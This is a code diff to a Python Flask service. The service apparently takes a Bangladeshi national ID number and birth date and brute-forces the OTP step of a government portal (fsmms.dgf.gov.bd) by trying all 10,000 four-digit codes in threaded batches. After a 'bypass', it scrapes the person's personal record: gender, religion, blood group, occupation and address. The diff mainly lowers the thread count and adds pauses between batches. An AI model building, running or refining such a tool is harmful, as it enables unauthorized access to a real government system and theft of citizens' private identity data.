@@ -4,14 +4,13 @@ import random
 import string
 import re
 import os
+import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 app = Flask(__name__)
 
 # --- Utilities for HTML Extraction ---
-
 def extract_selected_option(html_content, field_id):
-    """Extract selected option text from a dropdown field"""
     pattern = rf'<select[^>]*id="{field_id}"[^>]*>.*?<option[^>]*selected[^>]*>(.*?)</option>'
     match = re.search(pattern, html_content, re.DOTALL)
     if match:
@@ -19,7 +18,6 @@ def extract_selected_option(html_content, field_id):
     return ""
 
 def extract_fields(html_content, ids):
-    """Extract values from input fields of given IDs"""
     result = {}
     for field_id in ids:
         match = re.search(rf'<input[^>]*id="{field_id}"[^>]*value="([^"]*)"', html_content)
@@ -27,8 +25,6 @@ def extract_fields(html_content, ids):
     return result
 
 def enrich_data(contractor_name, html_content, result, nid, dob):
-    """Map extracted fields into response, and build address string"""
-    # Gender extraction (checked radio buttons)
     gender = ""
     if re.search(r'<input[^>]*id="maleGender"[^>]*checked', html_content):
         gender = "Male"
@@ -36,14 +32,11 @@ def enrich_data(contractor_name, html_content, result, nid, dob):
         gender = "Female"
     elif re.search(r'<input[^>]*id="otherGender"[^>]*checked', html_content):
         gender = "Other"
-
-    # Other dropdowns
     religion = extract_selected_option(html_content, "religion")
     occupation = extract_selected_option(html_content, "occupation")
     education = extract_selected_option(html_content, "education")
     blood_group = extract_selected_option(html_content, "bloodGroup")
     marital_status = extract_selected_option(html_content, "maritalStatus")
-
     mapped = {
         "nameBangla": contractor_name,
         "nameEnglish": "",
@@ -69,8 +62,6 @@ def enrich_data(contractor_name, html_content, result, nid, dob):
         "zip_code": result.get("nidPerZipCode", ""),
         "post_office": result.get("nidPerPostOffice", "")
     }
-
-    # Address string (bangla)
     address_parts = [
         f"বাসা/হোল্ডিং: {result.get('nidPerHolding', '-')}",
         f"গ্রাম/রাস্তা: {result.get('nidPerVillage', '')}",
@@ -94,8 +85,7 @@ def random_password():
 
 # --- OTP Strategies ---
 def generate_smart_otps(nid, dob):
-    """Placeholder for a 'smart' strategy, currently just returns first 100 4-digit codes."""
-    return [f"{i:04d}" for i in range(100)]  # Replace with smart logic if available
+    return [f"{i:04d}" for i in range(100)]
 
 # --- Cookie/Session Setup ---
 def get_cookie(data):
@@ -111,7 +101,6 @@ def get_cookie(data):
         raise Exception(f"Bypass Failed - Status: {res.status_code}, Detail: {res.text}")
 
 def try_otp(session, otp):
-    """Try a single OTP code. Returns code if successful."""
     url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step"
     data = {
         "otpDigit1": otp[0],
@@ -128,8 +117,8 @@ def try_otp(session, otp):
     return None
 
 def try_batch(session, otp_batch):
-    """Try a batch of OTP codes in parallel, returns code if found."""
-    with ThreadPoolExecutor(max_workers=30) as executor:  # 30 at a time to avoid server ban
+    # Use only 2 threads, split into tiny batches for low RAM!
+    with ThreadPoolExecutor(max_workers=2) as executor:
         future_to_otp = {executor.submit(try_otp, session, otp): otp for otp in otp_batch}
         for future in as_completed(future_to_otp):
             try:
@@ -147,7 +136,6 @@ def fetch_form_data(session):
     return res.text if res.status_code == 200 else ""
 
 # --- API Endpoints ---
-
 @app.route("/")
 def home():
     return jsonify({
@@ -178,7 +166,7 @@ def get_info():
         if not nid or not dob:
             return jsonify({"error": "NID and DOB are required"}), 400
 
-        batch_size = 100  # Lowered for safety
+        batch_size = 10  # Lowered for low RAM
         otp_range = [f"{i:04d}" for i in range(10000)]
         otp_list = generate_smart_otps(nid, dob) if strategy == "smart" else otp_range
 
@@ -192,13 +180,11 @@ def get_info():
             "next1": ""
         }
 
-        # 1. Get session/cookie
         try:
             session = get_cookie(data)
         except Exception as e:
             return jsonify({"error": str(e), "type": type(e).__name__, "stage": "get_cookie"}), 500
 
-        # 2. Try OTPs in batches
         random.shuffle(otp_list)
         found_otp = None
         for i in range(0, len(otp_list), batch_size):
@@ -209,8 +195,8 @@ def get_info():
                 continue
             if found_otp:
                 break
+            time.sleep(1)  # Prevent RAM spike by pausing between batches
 
-        # 3. If succeeded, get form and extract info
         if found_otp:
             html_content = fetch_form_data(session)
             ids = [
@@ -237,7 +223,6 @@ def get_info():
     except Exception as e:
         return jsonify({"error": str(e), "type": type(e).__name__}), 500
 
-# --- Debug endpoint for testing connectivity ---
 @app.route("/debug", methods=["GET"])
 def debug():
     nid = request.args.get("nid", "1234567890")
